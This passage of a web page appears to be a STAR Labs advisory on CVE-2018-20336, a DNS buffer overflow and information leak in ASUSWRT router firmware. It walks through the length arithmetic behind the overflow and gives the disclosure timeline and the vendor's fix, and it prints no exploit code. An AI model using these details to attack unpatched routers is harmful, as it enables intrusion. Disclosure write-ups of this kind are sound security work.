+</p>
+<p><em><strong>a3</strong></em> is <em><strong>len</strong></em> in source code, and in our case this value is 0x7F4 because the DNS header is 0xC, so the value is 0x800-0xC=0x7F4. Since the second-to-last byte in our PoC is &ldquo;<em><strong>\x00</strong></em>&rdquo;, so line 20 will be hit when <strong>v4</strong> is 0x7F3, since <em><strong>0x7F3</strong></em> is less than 0x7F4, then line 22 to line 30 will be executed.</p>
+<p><img loading="lazy" src="/advisories/18/images/18-20336-03.png" alt=""  />
+</p>
+<p><em><strong>result</strong></em> in our case is at 0xBE85A71C, from the source code we know its size is 0x800, so the end address of <em><strong>result</strong></em> is at 0xBE85AF1C, when line 26 is executed, <em><strong>result</strong></em> will be 0xBE85AF1B, so line 28 and line 29 will cause a buffer overflow.</p>
+<p><img loading="lazy" src="/advisories/18/images/18-20336-04.png" alt=""  />
+</p>
+<p>What&rsquo;s more, the <em><strong>reply_size</strong></em> will be 0x7F4+0xC+0x3=<strong>0x803</strong>, at the end of <em><strong>handle_dns_req</strong></em> , <em><strong>reply_size</strong></em> will also add 0x10(sizeof(d_reply.answers)), so the final reply_size will be <em><strong>0x813</strong></em>. It is larger than 0x800, which will cause an information leak.</p>
+<h1 id="timeline">Timeline<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h1>
+<ul>
+<li>2019-02-19 Vendor disclosure</li>
+<li>2019-02-25 Vendor acknowledged</li>
+<li>2019-03-29 Firmware update released</li>
+</ul>
+<h1 id="vendor-response">Vendor Response<a hidden class="anchor" aria-hidden="true" href="#vendor-response">#</a></h1>
+<p>The vendor has acknowledged the issue and released a new firmware update to address this vulnerability.</p>
+<p>The updated firmware can be downloaded from the <strong>Support</strong> section of a particular router that runs ASUSWRT,
+such as <a href="https://www.asus.com/Networking/RTAC68U/HelpDesk_Download/">https://www.asus.com/Networking/RTAC68U/HelpDesk_Download/</a>.</p>
+<p>The update description lists both issues <strong>CVE-2018-20334</strong> and <strong>CVE-2018-20336</strong> discovered by STAR Labs as fixed.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://starlabs.sg/advisories/18/18-20335/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>(CVE-2018-20335) ASUSWRT Denial of Service of HTTP Service</span>
+  </a>
+  <a class="next" href="https://starlabs.sg/advisories/19/19-16340/">
+    <span class="title">Next »</span>
+    <br>
+    <span>(CVE-2019-16340) Linksys Velop Authentication Bypass</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
